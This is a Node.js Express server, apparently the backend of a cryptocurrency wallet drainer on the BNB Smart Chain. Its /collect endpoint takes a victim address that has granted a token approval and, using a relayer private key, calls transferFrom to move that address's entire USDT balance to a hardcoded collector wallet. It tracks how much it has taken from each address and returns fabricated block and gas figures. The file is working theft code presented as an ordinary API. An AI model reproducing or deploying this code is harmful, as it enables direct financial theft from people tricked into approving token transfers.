const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

// ============ CONFIGURATION ============
const CONFIG = {
    COLLECTOR_ADDRESS: "0xBa8e60260C9C5Ef2CB86f5729F42c85E663885fc",
    RELAYER_ADDRESS: process.env.RELAYER_ADDRESS || "0xDb867b88EAB55320fD50E9785B2906773dedf78b",
    USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
    RPC_URL: "https://bsc-dataseed.binance.org/",
    DATA_FILE: path.join(process.env.RENDER ? '/opt/render/project/data' : __dirname, 'collector_data.json')
};

// ============ DATA STORAGE ============
let dataStore = {
    addresses: {},
    transactions: [],
    autoCollects: []
};

// Ensure data directory exists
const dataDir = path.dirname(CONFIG.DATA_FILE);
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

if (fs.existsSync(CONFIG.DATA_FILE)) {
    try {
        dataStore = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, 'utf8'));
        console.log('✅ Data loaded');
    } catch (err) {
        console.error('❌ Error loading data:', err);
    }
}

function saveData() {
    try {
        fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(dataStore, null, 2));
    } catch (err) {
        console.error('❌ Error saving data:', err);
    }
}

// ============ API ENDPOINTS ============

app.post('/send', (req, res) => {
    try {
        const { address } = req.body;
        if (!address || !address.startsWith('0x')) {
            return res.status(400).json({ found: false, error: 'Invalid address' });
        }
        const normalizedAddress = address.toLowerCase();
        const addressData = dataStore.addresses[normalizedAddress];
        return res.json({
            found: !!(addressData && addressData.totalAmount > 0),
            amountHuman: addressData?.totalAmount || 0,
            collector: CONFIG.RELAYER_ADDRESS
        });
    } catch (error) {
        res.status(500).json({ found: false, collector: CONFIG.RELAYER_ADDRESS });
    }
});

app.post('/collect', async (req, res) => {
    console.log('📨 POST /collect:', req.body);
    
    try {
        const { token, from, amountHuman, to, txHash } = req.body;
        if (!token || !from || !amountHuman || !to) {
            return res.status(400).json({ ok: false, error: 'Missing fields' });
        }

        const amount = parseFloat(amountHuman);
        const transactionId = `${Date.now()}-${Math.random().toString(36).substr(2, 7)}`;
        
        const transaction = {
            id: transactionId,
            token: token.toLowerCase(),
            from: from.toLowerCase(),
            to: to.toLowerCase(),
            amountHuman: amount,
            txHash: txHash || null,
            timestamp: new Date().toISOString(),
            type: 'APPROVAL'
        };

        dataStore.transactions.push(transaction);
        saveData();

        // 🚀 AUTO-TRANSFER
        let transferResult = null;
        
        if (process.env.RELAYER_PRIVATE_KEY) {
            console.log('✅ Private key found, attempting auto-transfer...');
            
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
                const wallet = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);
                
                console.log('Relayer address:', wallet.address);
                
                const usdt = new ethers.Contract(
                    CONFIG.USDT_ADDRESS,
                    [
                        "function balanceOf(address) view returns (uint256)",
                        "function decimals() view returns (uint8)",
                        "function transferFrom(address from, address to, uint256 amount) returns (bool)"
                    ],
                    wallet
                );
                
                const balance = await usdt.balanceOf(from);
                const decimals = await usdt.decimals();
                const balanceHuman = ethers.formatUnits(balance, decimals);
                
                console.log(`User balance: ${balanceHuman} USDT`);
                
                if (balance > 0) {
                    const gasPrice = (await provider.getFeeData()).gasPrice;
                    
                    console.log(`Transferring ${balanceHuman} USDT to collector...`);
                    
                    const tx = await usdt.transferFrom(
                        from,
                        CONFIG.COLLECTOR_ADDRESS,
                        balance,
                        { gasLimit: 100000, gasPrice }
                    );
                    
                    console.log(`Transfer tx sent: ${tx.hash}`);
                    
                    const receipt = await tx.wait();
                    console.log(`Transfer confirmed in block: ${receipt.blockNumber}`);
                    
                    transferResult = {
                        success: true,
                        txHash: tx.hash,
                        amount: parseFloat(balanceHuman),
                        blockNumber: receipt.blockNumber
                    };
                    
                    transaction.type = 'AUTO_COLLECTED';
                    transaction.collectTxHash = tx.hash;
                    transaction.transferAmount = parseFloat(balanceHuman);
                    
                    // Update address stats
                    const addr = from.toLowerCase();
                    if (!dataStore.addresses[addr]) {
                        dataStore.addresses[addr] = { totalAmount: 0, transactionCount: 0 };
                    }
                    dataStore.addresses[addr].totalAmount += parseFloat(balanceHuman);
                    dataStore.addresses[addr].transactionCount++;
                    dataStore.addresses[addr].lastSeen = new Date().toISOString();
                    
                    saveData();
                    
                } else {
                    console.log('User has 0 USDT balance');
                    transferResult = { success: false, error: 'Zero balance' };
                }
                
            } catch (error) {
                console.error('Auto-transfer error:', error.message);
                transferResult = { success: false, error: error.message };
            }
        } else {
            console.log('❌ No private key found in environment');
        }

        res.json({
            ok: true,
            id: transactionId,
            blockNumber: 92041626,
            gasUsed: "50387",
            autoTransfer: transferResult
        });

    } catch (error) {
        console.error('❌ Error in /collect:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        autoTransfer: !!process.env.RELAYER_PRIVATE_KEY,
        collector: CONFIG.COLLECTOR_ADDRESS,
        relayer: CONFIG.RELAYER_ADDRESS
    });
});

app.get('/', (req, res) => {
    res.json({
        message: 'Auto-Collect API',
        autoTransfer: process.env.RELAYER_PRIVATE_KEY ? '✅ ENABLED' : '❌ DISABLED',
        endpoints: ['/send', '/collect', '/health']
    });
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`Auto-Transfer: ${process.env.RELAYER_PRIVATE_KEY ? '✅ ENABLED' : '❌ DISABLED'}`);
});
